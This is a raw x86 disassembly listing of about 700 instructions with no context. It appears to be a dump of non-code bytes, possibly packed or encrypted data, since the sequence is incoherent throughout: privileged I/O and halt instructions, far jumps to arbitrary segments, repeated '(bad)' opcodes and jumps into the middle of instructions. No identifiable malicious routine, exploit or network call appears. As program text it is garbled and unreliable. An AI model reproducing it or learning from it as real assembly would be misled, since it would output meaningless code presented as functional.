  410d2e:	lea    edx,ds:0x4db5aadb
  410d34:	fwait
  410d35:	or     DWORD PTR [esi],0x26
  410d38:	mov    edx,0xb9176e99
  410d3d:	outs   dx,DWORD PTR ds:[esi]
  410d3e:	shl    bh,1
  410d40:	push   ds
  410d41:	hlt    
  410d42:	lods   eax,DWORD PTR ds:[esi]
  410d43:	xchg   edi,eax
  410d44:	pop    ecx
  410d45:	mov    eax,0xc5ecdb7e
  410d4a:	test   DWORD PTR [ebp+0x6343411c],eax
  410d50:	fmul   QWORD PTR [edi+eiz*2]
  410d53:	xchg   ebp,eax
  410d54:	push   ebp
  410d55:	dec    edi
  410d56:	inc    esp
  410d57:	jmp    0x5f24:0xf0f7fa95
  410d5e:	jns    0x410d6e
  410d60:	jge    0x410d15
  410d62:	loop   0x410d50
  410d64:	or     BYTE PTR ds:0x6f6496ce,0x5e
  410d6b:	aam    0x4c
  410d6d:	jb     0x410d3f
  410d6f:	in     eax,dx
  410d70:	loop   0x410d1e
  410d72:	cmp    eax,0x9e803410
  410d77:	push   eax
  410d78:	ret    0xec60
  410d7b:	and    BYTE PTR [eax],cl
  410d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d7e:	bndldx (bad),[ebx-0x74]
  410d82:	xchg   ebp,eax
  410d83:	and    dh,BYTE PTR ds:0xba0deb76
  410d89:	loop   0x410d2f
  410d8b:	das    
  410d8c:	fisttp DWORD PTR [eax+esi*1+0x58]
  410d90:	pop    es
  410d91:	in     al,0x59
  410d93:	out    0x82,al
  410d95:	mov    ebx,DWORD PTR [esi-0x1c]
  410d98:	popf   
  410d99:	mov    dh,0x3c
  410d9b:	jl     0x410e00
  410d9d:	add    BYTE PTR [edi],dh
  410d9f:	push   es
  410da0:	mov    ch,BYTE PTR [edx+0x2ad22872]
  410da6:	or     dl,ch
  410da8:	lock xchg ebp,eax
  410daa:	(bad)  
  410dab:	fbld   TBYTE PTR [eax]
  410dad:	fld    QWORD PTR [edx+esi*1]
  410db0:	popf   
  410db1:	sar    ecx,1
  410db3:	inc    ebp
  410db4:	dec    ebp
  410db5:	mov    esi,0x56554d51
  410dba:	leave  
  410dbb:	mov    dh,bh
  410dbd:	xchg   esp,eax
  410dbe:	push   0xbf630fd2
  410dc3:	lock in al,0x46
  410dc6:	fwait
  410dc7:	pop    ss
  410dc8:	fwait
  410dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dca:	xor    esp,eax
  410dcc:	mov    dh,0x15
  410dce:	xor    eax,0x6303c94c
  410dd3:	test   cl,dl
  410dd5:	cmp    eax,0xaf46df81
  410dda:	or     DWORD PTR [esi-0x43],eax
  410ddd:	adc    eax,0x2af41f9
  410de2:	sbb    al,0xf2
  410de4:	and    edx,esi
  410de6:	xor    BYTE PTR [ebx+0x70c1ac4a],al
  410dec:	jmp    0xa617:0x6cce1631
  410df3:	inc    esp
  410df4:	test   BYTE PTR [edx+0x77],bl
  410df7:	fisub  DWORD PTR [edi+0x6f51e7c6]
  410dfd:	mov    ebx,0xabc50714
  410e02:	std    
  410e03:	push   eax
  410e04:	enter  0x512e,0xcc
  410e08:	dec    ecx
  410e09:	xchg   ebp,eax
  410e0a:	jno    0x410e6b
  410e0c:	or     ah,BYTE PTR [eax+0x47]
  410e0f:	out    dx,al
  410e10:	lods   al,BYTE PTR ds:[esi]
  410e11:	sahf   
  410e12:	aaa    
  410e13:	sbb    BYTE PTR [eax+0x73581a54],ch
  410e19:	retf   
  410e1a:	adc    ecx,DWORD PTR [eax+0x15]
  410e1d:	jp     0x410e71
  410e1f:	or     ebp,0xffffffef
  410e22:	push   esp
  410e23:	shr    bh,1
  410e25:	sub    dl,BYTE PTR [ecx+edx*1]
  410e28:	jae    0x410e3c
  410e2a:	ror    DWORD PTR [edx-0x7b692678],cl
  410e30:	push   cs
  410e31:	loopne 0x410e02
  410e33:	sahf   
  410e34:	adc    eax,0x87e31cdc
  410e39:	mov    al,0x34
  410e3b:	shr    DWORD PTR [edx+0x1b],cl
  410e3e:	xchg   edx,eax
  410e3f:	test   BYTE PTR [ebx+0x2cf31b74],bh
  410e45:	(bad)  
  410e47:	dec    esp
  410e48:	mov    ds:0x982f7cef,al
  410e4d:	adc    esi,0x81a27be1
  410e53:	out    dx,eax
  410e54:	imul   ebp,DWORD PTR [edx-0x19],0x7e7fc760
  410e5b:	test   ecx,edi
  410e5d:	(bad)  
  410e5f:	retw   0xec40
  410e63:	adc    DWORD PTR [ecx],edi
  410e65:	or     BYTE PTR [ebp-0xbc42c3e],al
  410e6b:	out    dx,al
  410e6c:	xor    ebx,0xffffffd5
  410e6f:	dec    eax
  410e70:	inc    eax
  410e71:	add    bh,BYTE PTR [ebp+0x1b04e9aa]
  410e77:	xor    BYTE PTR [ebx+edi*8-0x18],ah
  410e7b:	sub    BYTE PTR [ebp+0x4f895dab],cl
  410e81:	xchg   esp,eax
  410e82:	adc    bl,ah
  410e84:	fs aaa 
  410e86:	shl    dh,1
  410e88:	fdivr  DWORD PTR [eax]
  410e8a:	add    al,0x7
  410e8c:	imul   ebx,edi,0x1b2cdbc3
  410e92:	mov    ebx,0x54ca2a60
  410e97:	xchg   ecx,eax
  410e98:	jl     0x410ecc
  410e9a:	inc    eax
  410e9b:	lods   al,BYTE PTR ds:[esi]
  410e9c:	stos   BYTE PTR es:[edi],al
  410e9d:	inc    ebx
  410e9e:	dec    esp
  410e9f:	(bad)  
  410ea0:	dec    esp
  410ea1:	sti    
  410ea2:	mov    ?,WORD PTR [eax]
  410ea4:	sbb    al,0x5e
  410ea6:	xor    ebp,DWORD PTR [edi+esi*1+0x51]
  410eaa:	lahf   
  410eab:	scas   al,BYTE PTR es:[edi]
  410eac:	mov    ebp,0xa553209
  410eb1:	ret    
  410eb2:	fld    DWORD PTR [ebx-0x59f99b6a]
  410eb8:	scas   eax,DWORD PTR es:[edi]
  410eb9:	mov    ch,0x43
  410ebb:	mov    ds:0x636d0125,al
  410ec0:	add    eax,0xdf72506e
  410ec5:	adc    ch,dl
  410ec7:	mov    eax,0xb6d8ddfa
  410ecc:	test   al,0x85
  410ece:	jmp    DWORD PTR [ecx]
  410ed0:	cmp    esi,DWORD PTR [eax-0x42]
  410ed3:	pusha  
  410ed4:	adc    dh,BYTE PTR [ebp+eiz*2+0x7c]
  410ed8:	aam    0xbb
  410eda:	and    eax,0xfa854a7e
  410edf:	out    0x17,al
  410ee1:	xor    BYTE PTR [esi+0x238794a5],0x55
  410ee8:	pushf  
  410ee9:	les    esp,FWORD PTR [edi-0x7e6c75b5]
  410eef:	push   eax
  410ef0:	neg    BYTE PTR [ecx]
  410ef2:	mov    edx,0xb773a38c
  410ef7:	icebp  
  410ef8:	or     al,0x55
  410efa:	call   0x9f75:0x5623f830
  410f01:	in     al,dx
  410f02:	int    0x11
  410f04:	push   esi
  410f06:	cmp    BYTE PTR [ecx-0x74],cl
  410f09:	shl    esp,cl
  410f0b:	xor    eax,DWORD PTR [esi+0x414b01fe]
  410f11:	les    eax,FWORD PTR [edx-0x5f0fa25b]
  410f17:	mov    ebp,0xe551adf5
  410f1c:	and    esp,DWORD PTR ss:[edx]
  410f1f:	mov    eax,ds:0xcf76d86f
  410f24:	push   0xffffffae
  410f26:	mov    ds:0x56416deb,eax
  410f2b:	cs dec edi
  410f2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2e:	cmc    
  410f2f:	mov    es,WORD PTR [edi+0xfe034c5]
  410f35:	into   
  410f36:	jb     0x410eea
  410f38:	pop    ds
  410f39:	(bad)  
  410f3a:	mov    ds:0xe5562870,al
  410f3f:	dec    ecx
  410f40:	mov    ebp,0xc2121ea4
  410f45:	inc    edi
  410f46:	push   0x492d6d74
  410f4b:	dec    edx
  410f4c:	icebp  
  410f4d:	aaa    
  410f4e:	test   BYTE PTR [eax],0x82
  410f51:	rcr    BYTE PTR [esi],0x35
  410f54:	repnz sub eax,0xfb75db02
  410f5a:	or     ah,bh
  410f5c:	aas    
  410f5d:	fisttp QWORD PTR [ebx+0x72]
  410f60:	adc    ebp,DWORD PTR [eax]
  410f62:	fs aas 
  410f64:	in     al,0x79
  410f66:	adc    eax,0x565393e8
  410f6b:	adc    DWORD PTR [edi-0x624a2eca],0xffffffd1
  410f72:	sub    ebp,DWORD PTR [ebx+ebx*2]
  410f75:	inc    esi
  410f76:	aam    0x42
  410f78:	add    bl,BYTE PTR [ebp+edi*2-0x5bd06ea3]
  410f7f:	add    DWORD PTR [ebp-0x65c0e56],esp
  410f85:	ins    BYTE PTR es:[edi],dx
  410f86:	sbb    bl,al
  410f88:	xchg   esp,edx
  410f8a:	je     0x410f5f
  410f8c:	xchg   edx,eax
  410f8d:	ja     0x410f1f
  410f8f:	int    0x55
  410f91:	mov    eax,ds:0x716098ee
  410f96:	hlt    
  410f97:	jne    0x410f9c
  410f99:	stc    
  410f9a:	jnp    0x410fb2
  410f9c:	jo     0x410ff8
  410f9e:	(bad)  
  410f9f:	neg    al
  410fa1:	xor    dl,bl
  410fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fa4:	(bad)  
  410fa5:	fild   WORD PTR [edx-0x2e1b5bfe]
  410fab:	or     DWORD PTR [esi],0xfffffffb
  410fae:	jmp    0x7188:0xa415c3e5
  410fb5:	ss clc 
  410fb7:	xor    DWORD PTR [edx-0x4d],ebx
  410fba:	pop    ecx
  410fbb:	mov    ds:0xa5f9c116,eax
  410fc0:	out    dx,ax
  410fc2:	arpl   WORD PTR [ebx+edx*1-0x3e],ax
  410fc6:	cmp    ebp,ecx
  410fc8:	push   edi
  410fc9:	out    0xef,eax
  410fcb:	mov    al,ds:0x6e658131
  410fd0:	cmp    eax,0x4d45c032
  410fd5:	fsub   DWORD PTR [esi+0x58f562a1]
  410fdb:	xchg   esi,eax
  410fdc:	push   ebx
  410fdd:	jno    0x411041
  410fdf:	dec    ebx
  410fe0:	add    al,0xfc
  410fe2:	dec    edx
  410fe3:	mov    dl,0x35
  410fe5:	stc    
  410fe6:	addr16 pop esi
  410fe8:	xchg   edi,eax
  410fe9:	jno    0x410fab
  410feb:	xor    DWORD PTR [edx+ecx*8],ecx
  410fee:	jp     0x411053
  410ff0:	or     eax,0x7f112a4c
  410ff5:	sahf   
  410ff6:	stos   DWORD PTR es:[edi],eax
  410ff7:	dec    esp
  410ff8:	fsub   QWORD PTR [esi+ecx*1+0x39]
  410ffc:	inc    ecx
  410ffd:	call   FWORD PTR [ebx-0x2de73db0]
  411003:	mov    al,BYTE PTR [ebp+0x4e]
  411006:	mov    cl,0x8f
  411008:	and    bh,BYTE PTR [ebx+0xb2ef035]
  41100e:	test   al,0xcf
  411010:	push   esp
  411011:	gs jns 0x410ffc
  411014:	mul    DWORD PTR [ebp-0xc]
  411017:	fisttp QWORD PTR [eax-0x2e34fa67]
  41101d:	and    ebx,ecx
  41101f:	mov    al,ds:0xcfb13ead
  411024:	imul   ebp,DWORD PTR [edx],0x2a
  411027:	or     DWORD PTR [esi-0x16cbbe18],ebx
  41102d:	das    
  41102e:	div    DWORD PTR [ecx+0x29]
  411031:	cld    
  411032:	je     0x411053
  411034:	pop    ecx
  411035:	jae    0x410fea
  411037:	jg     0x410feb
  411039:	or     eax,0xfd83df5a
  41103e:	pop    es
  41103f:	pop    ecx
  411040:	mov    edx,eax
  411042:	jle    0x410fca
  411044:	loopne 0x4110ae
  411046:	and    ecx,DWORD PTR [ecx+0x15f3bae]
  41104c:	(bad)  
  41104d:	dec    edi
  41104e:	ins    BYTE PTR es:[edi],dx
  41104f:	ret    
  411050:	mov    ds:0x4ccb226b,eax
  411055:	pop    ebx
  411056:	xchg   ebx,eax
  411057:	aaa    
  411058:	stos   BYTE PTR es:[edi],al
  411059:	add    BYTE PTR [eax-0x44],0x9
  41105d:	std    
  41105e:	les    eax,FWORD PTR [ebp+0x48b5580a]
  411064:	push   edi
  411065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411066:	push   es
  411067:	inc    esi
  411068:	bound  ebx,QWORD PTR [ecx-0x34]
  41106b:	fcom   DWORD PTR [ebx+0x5b6c01ef]
  411071:	mov    ecx,0x79c68ff2
  411076:	outs   dx,BYTE PTR ds:[esi]
  411077:	mov    ah,0x8
  411079:	mov    eax,0xf0610f7a
  41107e:	mov    al,ds:0x6a29839b
  411083:	inc    esp
  411084:	mov    ah,0x1b
  411086:	xchg   edx,eax
  411087:	shl    DWORD PTR [edi-0x56595453],1
  41108d:	sbb    al,0xbd
  41108f:	adc    ecx,DWORD PTR [esi+0x7]
  411092:	xchg   ecx,eax
  411093:	adc    ebp,ebp
  411095:	push   ebx
  411096:	sub    bh,bh
  411098:	cmp    DWORD PTR [eax+0x57bcb5f],esi
  41109e:	gs cs mov esi,esp
  4110a2:	jbe    0x411115
  4110a4:	bound  ebx,QWORD PTR [ebp+0x26]
  4110a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110a8:	jns    0x411064
  4110aa:	aad    0x5d
  4110ac:	adc    eax,0x77143989
  4110b1:	fwait
  4110b2:	cmp    eax,0x25c2760c
  4110b7:	sbb    BYTE PTR [ebx+0x53],dl
  4110ba:	in     eax,dx
  4110bb:	sbb    BYTE PTR [ebp-0x1f],bh
  4110be:	cmp    BYTE PTR [eax-0x4b],ah
  4110c1:	retf   0xaa8b
  4110c4:	scas   al,BYTE PTR es:[edi]
  4110c5:	outs   dx,BYTE PTR ds:[esi]
  4110c6:	pop    eax
  4110c7:	mov    DWORD PTR [ecx-0x22],ecx
  4110ca:	loop   0x41108d
  4110cc:	outs   dx,DWORD PTR ds:[esi]
  4110cd:	push   ebx
  4110ce:	in     al,dx
  4110cf:	or     DWORD PTR [ebx+0x1f],edx
  4110d2:	addr16 daa 
  4110d4:	jmp    0xd7ff012e
  4110d9:	cmp    DWORD PTR [eax+edi*2-0x1b],ebx
  4110dd:	mov    ds,WORD PTR fs:[esi+0x4d]
  4110e1:	dec    ecx
  4110e2:	js     0x4110f2
  4110e4:	mov    eax,0xc9d901a4
  4110e9:	pop    esi
  4110ea:	shl    BYTE PTR [edx+0x7b],1
  4110ed:	mov    ds:0x663046c0,eax
  4110f2:	js     0x41112b
  4110f4:	cli    
  4110f5:	inc    ecx
  4110f6:	lods   al,BYTE PTR ds:[esi]
  4110f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110f8:	add    eax,0x34cc6786
  4110fd:	mov    WORD PTR [edi+0x2e28ec92],fs
  411103:	outs   dx,DWORD PTR ds:[esi]
  411104:	popa   
  411105:	aas    
  411106:	push   ss
  411107:	(bad)  
  411108:	mov    bl,0xa
  41110a:	push   ecx
  41110b:	push   ebx
  41110c:	bound  esi,QWORD PTR [esi]
  41110e:	fbstp  TBYTE PTR ss:[edx-0x37]
  411112:	pop    edi
  411113:	mov    ah,0xae
  411115:	dec    ecx
  411116:	cli    
  411117:	enter  0x515a,0x40
  41111b:	dec    ebp
  41111c:	dec    ebx
  41111d:	ins    BYTE PTR es:[edi],dx
  41111e:	lods   eax,DWORD PTR ds:[esi]
  41111f:	mov    al,ds:0xaecb59cf
  411124:	jo     0xb893f676
  41112a:	and    ebp,DWORD PTR [esi-0x39]
  41112d:	jle    0x4110de
  41112f:	xchg   DWORD PTR [edx-0x57c95215],esp
  411135:	enter  0xd383,0x14
  411139:	stc    
  41113a:	pop    esp
  41113b:	(bad)
  41113f:	xchg   ebx,eax
  411140:	mov    WORD PTR [ecx+0x40],gs
  411143:	test   BYTE PTR [eax],dl
  411145:	sbb    eax,0xd8a92104
  41114a:	pop    edx
  41114b:	push   ecx
  41114c:	pop    edx
  41114d:	sub    cl,cl
  41114f:	shr    ecx,cl
  411151:	leave  
  411152:	mul    BYTE PTR [ebx+0x2a]
  411155:	xlat   BYTE PTR ds:[ebx]
  411156:	cld    
  411157:	push   ss
  411158:	loopne 0x41117d
  41115a:	mov    ch,0x7f
  41115c:	dec    ebx
  41115d:	jmp    0x4bc9:0xb9360877
  411164:	imul   esi,DWORD PTR [eax-0x7],0x347cb9f3
  41116b:	ret    
  41116c:	shr    BYTE PTR [edx+ecx*2-0x1c],1
  411170:	loopne 0x411194
  411172:	mov    ecx,0x557a48d5
  411177:	sub    BYTE PTR [edi+0x65],al
  41117a:	enter  0x148,0x63
  41117e:	loope  0x411155
  411180:	mov    edi,0x8fd64519
  411185:	pusha  
  411186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411187:	or     ah,BYTE PTR [edx]
  411189:	cld    
  41118a:	pusha  
  41118b:	(bad)  
  41118c:	sahf   
  41118d:	sub    al,0x84
  41118f:	popa   
  411190:	pop    DWORD PTR [ecx]
  411192:	in     al,0xc6
  411194:	dec    edx
  411195:	pop    esp
  411196:	xor    ah,BYTE PTR [eax-0x149aae6b]
  41119c:	mov    esp,0x30e2f1d0
  4111a1:	and    cl,0x9f
  4111a4:	sub    dl,BYTE PTR [edi]
  4111a6:	mov    ds:0x90f332e5,al
  4111ab:	imul   ecx,DWORD PTR [ecx-0x746526f8],0x6a
  4111b2:	jle    0x41113b
  4111b4:	xlat   BYTE PTR ds:[bx]
  4111b6:	add    DWORD PTR [ecx-0x39],ebp
  4111b9:	outs   dx,DWORD PTR ds:[esi]
  4111ba:	sbb    esi,DWORD PTR [edi+0x4]
  4111bd:	mov    ecx,0x16d205ad
  4111c2:	jb     0x41118a
  4111c4:	inc    esp
  4111c5:	xor    BYTE PTR [edx-0x63b6f54],cl
  4111cb:	fs add eax,0xbc565432
  4111d1:	stc    
  4111d2:	sti    
  4111d3:	mov    ah,0xd2
  4111d5:	jmp    0x41117a
  4111d7:	jg     0x41116a
  4111d9:	sbb    cl,ch
  4111db:	stc    
  4111dc:	pop    edi
  4111dd:	pushf  
  4111de:	(bad)  
  4111e0:	pop    eax
  4111e1:	outs   dx,DWORD PTR ds:[esi]
  4111e2:	stc    
  4111e3:	push   edx
  4111e4:	fisttp WORD PTR [eax+0x42]
  4111e7:	push   ebp
  4111e8:	(bad)  
  4111e9:	call   0x8915:0x280dee66
  4111f0:	mov    ss,WORD PTR [eax+ebp*4-0x63]
  4111f4:	jecxz  0x411204
  4111f6:	retf   0x502
  4111f9:	mov    esi,0x4ec98f65
  4111fe:	jp     0x41125f
  411200:	fild   QWORD PTR [ebx+esi*1]
  411203:	les    esi,FWORD PTR [edi-0x21bbed30]
  411209:	xchg   ecx,eax
  41120a:	push   ecx
  41120b:	addr16 push ebp
  41120d:	inc    ecx
  41120e:	inc    ecx
  41120f:	cmp    edi,edx
  411211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411212:	mov    bh,BYTE PTR [ebx-0x54]
  411215:	inc    esp
  411216:	xor    DWORD PTR [esi-0x2b],edx
  411219:	ret    0x37c5
  41121c:	clc    
  41121d:	iret   
  41121e:	rep stos DWORD PTR es:[edi],eax
  411220:	pop    ds
  411221:	adc    BYTE PTR [ebx+edx*1-0x5bd2ce34],dl
  411228:	add    al,0xd8
  41122a:	stos   BYTE PTR es:[edi],al
  41122b:	dec    edi
  41122c:	xchg   BYTE PTR ds:0x9da37f48,cl
  411232:	xchg   ebp,eax
  411233:	adc    dl,BYTE PTR [eax-0xb2a0a41]
  411239:	lods   eax,DWORD PTR ds:[esi]
  41123a:	sbb    BYTE PTR [esi-0x71],cl
  41123d:	retf   0xd89a
  411240:	dec    DWORD PTR [edi+0x1e]
  411243:	pusha  
  411244:	pop    es
  411245:	mov    WORD PTR [ebx+ebx*1+0x7d],es
  411249:	jecxz  0x411269
  41124b:	push   eax
  41124c:	dec    edx
  41124d:	ret    0xf946
  411250:	jg     0x41121f
  411252:	shl    DWORD PTR ss:[edi-0x7857fd26],cl
  411259:	add    eax,0x470cda77
  41125e:	mov    edx,0x65307e46
  411263:	push   0x19
  411265:	out    dx,eax
  411266:	mov    al,ds:0x21905380
  41126b:	push   ecx
  41126c:	fs push ss
  41126e:	pop    ds
  41126f:	xchg   BYTE PTR [esi-0x55],bh
  411272:	pop    DWORD PTR [ebx]
  411274:	push   esi
  411275:	mov    dh,BYTE PTR [edx-0x32aa27a7]
  41127b:	or     dh,BYTE PTR [eax]
  41127d:	mov    al,ds:0xbcc6c8a8
  411282:	xchg   edi,eax
  411283:	in     ax,0xb0
  411286:	adc    al,0xca
  411288:	lds    ecx,FWORD PTR [esi+edx*8+0x3a]
  41128c:	(bad)  
  41128e:	mov    esi,0x7005b131
  411293:	jnp    0x41125a
  411295:	fdiv   st(3),st
  411297:	in     eax,0xdc
  411299:	std    
  41129a:	mov    BYTE PTR [ebx],ah
  41129c:	sar    DWORD PTR [ecx+eiz*4+0x25],0x4a
  4112a1:	mov    ss,WORD PTR [ecx]
  4112a3:	(bad)  
  4112a4:	das    
  4112a5:	xor    al,BYTE PTR [ecx-0x7b]
  4112a8:	rol    BYTE PTR [ecx+0x19c7aa80],0x97
  4112af:	out    0x8c,al
  4112b1:	aam    0xc5
  4112b3:	mov    ecx,0x166a6206
  4112b8:	xchg   ebx,eax
  4112b9:	sub    al,0x6
  4112bb:	push   ds
  4112bc:	push   esi
  4112bd:	mov    ebx,0xdb04438e
  4112c2:	xchg   ebx,eax
  4112c3:	daa    
  4112c4:	sub    BYTE PTR [ebp+0x607647e4],cl
  4112ca:	(bad)  
  4112cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112cc:	mov    esp,0x2217ce62
  4112d1:	mov    esp,DWORD PTR [eax+0x10d3405f]
  4112d7:	jle    0x4112eb
  4112d9:	jmp    0x411283
  4112db:	test   DWORD PTR [edi-0x6deca040],ecx
  4112e1:	(bad)  
  4112e2:	mov    esp,0x501b0083
  4112e7:	stos   DWORD PTR es:[edi],eax
  4112e8:	and    DWORD PTR [esi+0xb8aa4fb],esi
  4112ee:	push   esp
  4112ef:	xchg   edx,eax
  4112f0:	fst    QWORD PTR [ebx-0x60]
  4112f3:	adc    edx,ebx
  4112f5:	fwait
  4112f6:	test   DWORD PTR [ebp+esi*8-0x66],0x863316ca
  4112fe:	push   es
  4112ff:	fld    DWORD PTR [ecx]
  411301:	add    ecx,DWORD PTR [ebx-0x2bb7ad07]
  411307:	pop    bx
  411309:	leave  
  41130a:	sahf   
  41130b:	cdq    
  41130c:	test   eax,0x7af94d25
  411311:	dec    ecx
  411312:	push   ebp
  411313:	test   eax,0x7faf8a13
  411318:	push   ecx
  411319:	retf   0x64cb
  41131c:	sbb    eax,0xcc469e8f
  411321:	xor    DWORD PTR [ecx+0x54b808c5],ebp
  411327:	cmp    BYTE PTR [ecx+0x7f],ch
  41132a:	mov    edi,0xa869884d
  41132f:	pop    ds
  411330:	imul   ebp,DWORD PTR [ecx+eiz*2-0x4a72177b],0x11
  411338:	sbb    DWORD PTR [esi],edx
  41133a:	fs mov eax,0xe9ff1364
  411340:	dec    esi
  411341:	add    dl,dl
  411343:	gs enter 0xf67,0x43
  411348:	mov    edi,0x3b15037
  41134d:	ds jmp 0x41133a
  411350:	(bad)  
  411351:	int    0xce
  411353:	hlt    
  411354:	retf   0xf6f7
  411357:	call   0x6cc298df
  41135c:	jbe    0x41132d
  41135e:	lock mov edi,0x45e7328b
  411364:	pop    esp
  411365:	inc    edi
  411366:	dec    ebx
  411367:	cdq    
  411368:	or     DWORD PTR [edi+esi*2-0x6769aabf],esi
  41136f:	and    edi,DWORD PTR [edi-0x41]
  411372:	and    BYTE PTR [ecx-0x57],dl
  411375:	cmp    ebp,DWORD PTR [ebx-0x4fde1ec9]
  41137b:	xchg   DWORD PTR [ebp-0x67],ecx
  41137e:	inc    esi
  41137f:	data16 (bad) 
  411381:	cmp    ch,dl
  411383:	fldcw  WORD PTR [eax+0x6692c7f6]
  411389:	popa   
  41138a:	xlat   BYTE PTR ds:[bx]
  41138c:	cwde   
  41138d:	dec    esp
  41138e:	mov    edx,0x2d2f6c22
  411393:	adc    eax,0x6529aebe
  411398:	xor    BYTE PTR [ebp-0x38ad8908],cl
  41139e:	cwde   
  41139f:	push   es
  4113a0:	mov    esi,0x5059503a
  4113a5:	ds and ch,bh
  4113a8:	and    cl,BYTE PTR [ebx+0x51]
  4113ab:	jo     0x4113ed
  4113ad:	ret    
  4113ae:	mov    dl,0xd9
  4113b0:	pushf  
  4113b1:	mov    eax,0x1112d06a
  4113b6:	pop    ecx
  4113b7:	in     eax,0x33
  4113b9:	inc    esi
  4113ba:	mov    ebp,0xa69d9bc2
  4113bf:	and    ebx,DWORD PTR ds:0x14d14d53
  4113c5:	shr    BYTE PTR [ebx-0x4e],0x35
  4113c9:	mov    al,ds:0x305657a6
  4113ce:	cmp    ecx,edx
  4113d0:	jnp    0x411411
  4113d2:	mov    bl,0xbd
  4113d4:	int3   
  4113d5:	add    BYTE PTR [ebx],0x5d
  4113d8:	add    BYTE PTR [esi+eiz*4+0x5b],dh
  4113dc:	mov    eax,ds:0xa117672d
  4113e1:	jmp    ebx
  4113e3:	mov    ebx,esp
  4113e5:	adc    ecx,DWORD PTR [esi]
  4113e7:	jb     0x41138e
  4113e9:	adc    ebx,ebp
  4113eb:	push   0x76
  4113ed:	xchg   esi,eax
  4113ee:	cmp    al,0x3d
  4113f0:	popa   
  4113f1:	adc    al,0x8d
  4113f3:	sbb    ch,BYTE PTR [ecx+0x50a6c4c3]
  4113f9:	push   es
  4113fa:	xor    DWORD PTR [ebp+0x42e9748],0x5e
  411401:	push   ss
  411402:	xchg   BYTE PTR [edi-0x51],al
  411405:	lods   eax,DWORD PTR ds:[esi]
  411406:	jecxz  0x4113e3
  411408:	nop
  411409:	xchg   esp,eax
  41140a:	pushf  
  41140b:	xchg   ebp,eax
  41140c:	xchg   esp,eax
  41140d:	push   ds
  41140e:	lahf   
  41140f:	inc    ebp
  411410:	shr    BYTE PTR [ebp+0x64],cl
  411413:	popa   
  411414:	pop    edx
  411415:	int    0xf
  411417:	add    eax,0x59f440bd
  41141c:	test   BYTE PTR [esi+0x3],0xfc
  411420:	fdiv   DWORD PTR [esp+ebp*2]
  411423:	stos   BYTE PTR es:[edi],al
  411424:	idiv   BYTE PTR [edi-0x47f4e899]
  41142a:	aaa    
  41142b:	mov    ds:0x5a5cf095,al
  411430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411431:	in     eax,dx
  411432:	jmp    0x2643:0x3c700958
  411439:	pop    es
  41143a:	xor    edx,DWORD PTR [edi+edx*2-0x7fb0dcb8]
  411441:	jne    0x4113e9
  411443:	pop    esi
  411444:	ins    BYTE PTR es:[edi],dx
  411445:	inc    ebp
  411446:	mov    al,ds:0xfde5ff0a
  41144b:	sbb    BYTE PTR [ecx+0x4b507269],0x4d
  411452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411453:	jle    0x411402
  411455:	shl    DWORD PTR [ebx],0xdf
  411458:	inc    ebp
  411459:	fwait
  41145a:	shl    ah,0x8d
  41145d:	inc    esi
  41145e:	inc    eax
  41145f:	in     eax,dx
  411460:	pop    edi
  411461:	ins    BYTE PTR es:[edi],dx
  411462:	adc    eax,0x8ea4ea0e
  411467:	and    BYTE PTR [ebp+0x1],cl
  41146a:	fcomp  st(0)
  41146c:	sbb    BYTE PTR [edx],dh
  41146e:	add    BYTE PTR [ecx-0x551d5530],al
  411474:	les    esi,FWORD PTR [edi+ebp*4+0x20]
  411478:	scas   eax,DWORD PTR es:[edi]
  411479:	enter  0x38ac,0x1c
  41147d:	loop   0x411417
  41147f:	stos   BYTE PTR es:[edi],al
  411480:	push   ebx
  411481:	pushf  
  411482:	adc    al,0x7b
  411484:	sbb    ch,BYTE PTR [ecx+0x34]
  411487:	add    bh,dh
  411489:	add    DWORD PTR [ebx],0x453746fa
  41148f:	retf   
  411490:	sti    
  411491:	pop    esi
  411492:	fmulp  st(4),st
  411494:	neg    BYTE PTR [ecx-0x3b]
  411497:	stc    
  411498:	je     0x4114d6
  41149a:	mov    dl,0x13
  41149c:	jmp    0x411442
  41149e:	and    bh,0x65
  4114a1:	inc    esi
  4114a2:	outs   dx,BYTE PTR ds:[esi]
  4114a3:	mov    ds:0xa5d8d781,al
  4114a8:	outs   dx,DWORD PTR ds:[esi]
  4114a9:	mov    edx,0x3cc1dbe6
  4114ae:	inc    DWORD PTR [edx+0x35a84a]
  4114b4:	call   0x8da44d86
  4114b9:	inc    ebp
  4114ba:	stos   BYTE PTR es:[edi],al
  4114bb:	jae    0x411449
  4114bd:	dec    ebp
  4114be:	push   eax
  4114bf:	arpl   WORD PTR [esi+0x7c298381],dx
  4114c5:	and    ecx,esp
  4114c7:	add    ch,BYTE PTR [edx+eiz*4]
  4114ca:	retf   0x4485
  4114cd:	xchg   bl,dh
  4114cf:	jg     0x41148e
  4114d1:	jmp    0x73c6:0x6a1b529b
  4114d8:	cmp    BYTE PTR [edx-0x7d],bl
  4114db:	scas   eax,DWORD PTR es:[edi]
  4114dc:	sahf   
  4114dd:	ds push 0xe
  4114e0:	lds    esi,FWORD PTR [ebx+edx*1+0x73]
  4114e4:	inc    ecx
  4114e5:	iret   
  4114e6:	call   FWORD PTR [ecx-0x43f5ce85]
  4114ec:	xor    dl,BYTE PTR [edi+ebx*8+0x31]
  4114f0:	push   0xffffffae
  4114f2:	nop
  4114f3:	pop    edx
  4114f4:	bound  eax,QWORD PTR [ecx]
  4114f6:	push   0xcbcdb3e1
  4114fb:	mov    eax,0x8182cbe4
  411500:	sub    eax,0xb40917b0
  411505:	add    bp,WORD PTR [esi-0x1a]
  411509:	jno    0x41151b
  41150b:	or     al,0x3a
  41150d:	push   edi
  41150e:	or     al,0xef
  411510:	pop    ecx
  411511:	mov    edi,0x80d9dfea
  411516:	call   DWORD PTR [esi+ecx*8]
  41151a:	jno    0x4114f9
  41151c:	js     0x411583
